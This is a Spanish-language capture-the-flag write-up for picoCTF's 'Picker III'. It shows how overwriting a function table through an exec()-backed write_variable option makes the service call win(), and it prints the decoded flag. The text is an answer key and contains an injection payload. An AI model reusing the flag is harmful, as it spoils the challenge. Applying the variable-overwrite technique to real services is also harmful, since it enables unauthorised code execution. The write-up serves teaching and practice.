**RETO:** Picker III

**DESCRIPCION:**  
Can you figure out how this program works to get the flag? The program's source code can be downloaded here.

**SOLUCION:**

- Descargué el archivo picker-III.py que contenía el código fuente del servicio
    
- Analicé el código y encontré que usaba una tabla de funciones (`func_table`) para limitar qué funciones podían ser ejecutadas
    
- Identifiqué que la variable global `func_table` podía ser modificada usando la función `write_variable()`
    
- La función `call_func(n)` ejecutaba funciones desde la tabla usando `eval()`
    
- Modifiqué `func_table` para reemplazar `getRandomNumber` con `win` en la cuarta posición
    
- Ejecuté la función en la posición 4 para llamar a `win()` y obtener la flag
    

**Proceso de solución:**

1. **Conectar al servicio y ver la tabla inicial:**
    
    bash
    
    nc saturn.picoctf.net 55436
    ==> help
    
2. **Usar write_variable para modificar func_table:**
    
    text
    
    ==> 3
    Please enter variable name to write: func_table
    Please enter new value of variable: "print_table                     read_variable                   write_variable                  win                             "
    
3. **Ejecutar la función en la posición 4 (ahora win):**
    
    text
    
    ==> 4
    
4. **Obtener la flag en hexadecimal:**
    
    text
    
    0x70 0x69 0x63 0x6f 0x43 0x54 0x46 0x7b 0x37 0x68 0x31 0x35 0x5f 0x31 0x35 0x5f 0x77 0x68 0x34 0x37 0x5f 0x77 0x33 0x5f 0x67 0x33 0x37 0x5f 0x77 0x31 0x37 0x68 0x5f 0x75 0x35 0x33 0x72 0x35 0x5f 0x31 0x6e 0x5f 0x63 0x68 0x34 0x72 0x67 0x33 0x5f 0x32 0x32 0x36 0x64 0x64 0x32 0x38 0x35 0x7d
    
5. **Convertir hexadecimal a texto:**
    
    python
    
    hex_values = "0x70 0x69 0x63 0x6f 0x43 0x54 0x46 0x7b 0x37 0x68 0x31 0x35 0x5f 0x31 0x35 0x5f 0x77 0x68 0x34 0x37 0x5f 0x77 0x33 0x5f 0x67 0x33 0x37 0x5f 0x77 0x31 0x37 0x68 0x5f 0x75 0x35 0x33 0x72 0x35 0x5f 0x31 0x6e 0x5f 0x63 0x68 0x34 0x72 0x67 0x33 0x5f 0x32 0x32 0x36 0x64 0x64 0x32 0x38 0x35 0x7d".split()
    flag = ''.join(chr(int(h, 16)) for h in hex_values)
    print(flag)
    

**Flag:** `picoCTF{7h15_15_wh47_w3_g37_w17h_u53r5_1n_ch4rg3_226dd285}`

**NOTAS:**

- El reto demostró que incluso con tablas de funciones restrictivas, si el usuario puede modificar la tabla, el control se pierde
    
- La vulnerabilidad estaba en permitir la modificación de `func_table` mediante `write_variable()`
    
- La función `exec()` usada en `write_variable()` permitió la modificación de variables críticas
    
- La flag "7h15_15_wh47_w3_g37_w17h_u53r5_1n_ch4rg3_226dd285" significa "this is what we get with users in charge" en leet speak
    
- Los sistemas de seguridad deben proteger no solo qué funciones se ejecutan, sino también los mecanismos de control mismos
    
- Las tablas de funciones deben ser inmutables o protegidas contra modificaciones no autorizadas